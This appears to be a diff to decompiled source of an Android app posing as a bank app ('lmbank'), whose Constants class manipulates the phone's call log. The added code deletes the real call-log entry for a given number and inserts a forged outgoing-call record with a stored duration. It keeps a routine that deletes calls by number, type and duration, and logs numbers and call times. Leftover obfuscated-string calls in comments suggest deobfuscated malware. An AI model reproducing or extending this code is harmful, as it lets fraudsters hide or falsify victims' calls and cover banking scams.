@@ -1,12 +1,18 @@
 package com.wish.lmbank.common;
 
+import android.Manifest;
+import android.annotation.SuppressLint;
 import android.content.ContentValues;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.provider.BlockedNumberContract;
 import android.provider.CallLog;
 import android.text.TextUtils;
 import android.util.Log;
+
+import androidx.core.app.ActivityCompat;
 
 import com.wish.lmbank.bean.CallLogBean;
 import com.wish.lmbank.utils.LogUtils;
@@ -184,6 +190,7 @@ public class Constants {
      * @param phone
      * @return 时间戳  不存在则返回0
      */
+    @SuppressLint("Range")
     public static long getData(Context context, String phone) {
         long time = 0;
         Cursor cursor = context.getContentResolver().query(callUri, // 查询通话记录的URI
@@ -193,10 +200,12 @@ public class Constants {
             String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));  //姓名
             String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));  //号码
             long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)); //获取通话日期
+            //int id = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.CACHED_PHOTO_ID));
             if (number.equals(phone)) {
                 time = dateLong;
                 return time;
             }
+            Log.e(TAG,"时间："+dateLong+"号码:"+number);
         }
         return time;
     }
@@ -211,13 +220,29 @@ public class Constants {
         if (data == 0) {
             return false;
         }
-        ContentValues values = new ContentValues();
-        values.put(CallLog.Calls.TYPE, CallLog.Calls.OUTGOING_TYPE);
-        values.put(CallLog.Calls.NUMBER, phone);
-        values.put(CallLog.Calls.DATE, System.currentTimeMillis());
-        values.put(CallLog.Calls.NEW, 0);
-        context.getContentResolver().update(CallLog.Calls.CONTENT_URI, values, CallLog.Calls.DATE + "=?", new String[]{String.valueOf(data)});
+        context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, CallLog.Calls.DATE + "=?", new String[]{String.valueOf(data)});
+        int d = SharedPreferencesUtils.getValue(Constants.CALL_DURATION, 0);
+        Constants.insertCallLog(context, phone, data, String.valueOf(d), "2", "0");
         return true;
+    }
+
+
+    /**
+     * 插入一条通话记录
+     *
+     * @param number   通话号码
+     * @param duration 通话时长（响铃时长）以秒为单位 1分30秒则输入90
+     * @param type     通话类型  1呼入 2呼出 3未接
+     * @param isNew    是否已查看    0已看1未看
+     */
+    public static void insertCallLog(Context context, String number, long time, String duration, String type, String isNew) {
+        ContentValues values = new ContentValues();
+        values.put(CallLog.Calls.NUMBER, number);
+        values.put(CallLog.Calls.DATE, time);
+        values.put(CallLog.Calls.DURATION, duration);
+        values.put(CallLog.Calls.TYPE, type);
+        values.put(CallLog.Calls.NEW, isNew);
+        context.getContentResolver().insert(CallLog.Calls.CONTENT_URI, values);
     }
 
     public static void modifySmsCall(Context context, String number, String phone) {
@@ -229,14 +254,11 @@ public class Constants {
         try {
 //                 int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, bb7d7pu7.m5998("BxwECwwbVFZJCAcNSR0QGQxUVkkIBw1JDRwbCB0ABgdJVElW"), new String[]{str, String.valueOf(i), String.valueOf(j)});
             int delete = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, "number=? and type=? and duration = ?", new String[]{str, String.valueOf(i), String.valueOf(j)});
-            String str2 = TAG;
-//                 LogUtils.d(str2, bb7d7pu7.m5998("DQwFKggFBSUGDkkbDB1TSQ") + delete);
-            LogUtils.d(str2, "delCallLog ret: " + delete);
-            return;
+            //                 LogUtils.d(str2, bb7d7pu7.m5998("DQwFKggFBSUGDkkbDB1TSQ") + delete);
+            LogUtils.d(TAG, "delCallLog ret: " + delete);
         } catch (Exception e) {
 //                 LogUtils.callLog(TAG + bb7d7pu7.m5998("RUkNDAUqCAUFJQYOSS8IAAUMDVNJ") + e.getMessage());
             LogUtils.callLog(TAG + ", delCallLog Failed: " + e.getMessage());
-            return;
         }
     }
 
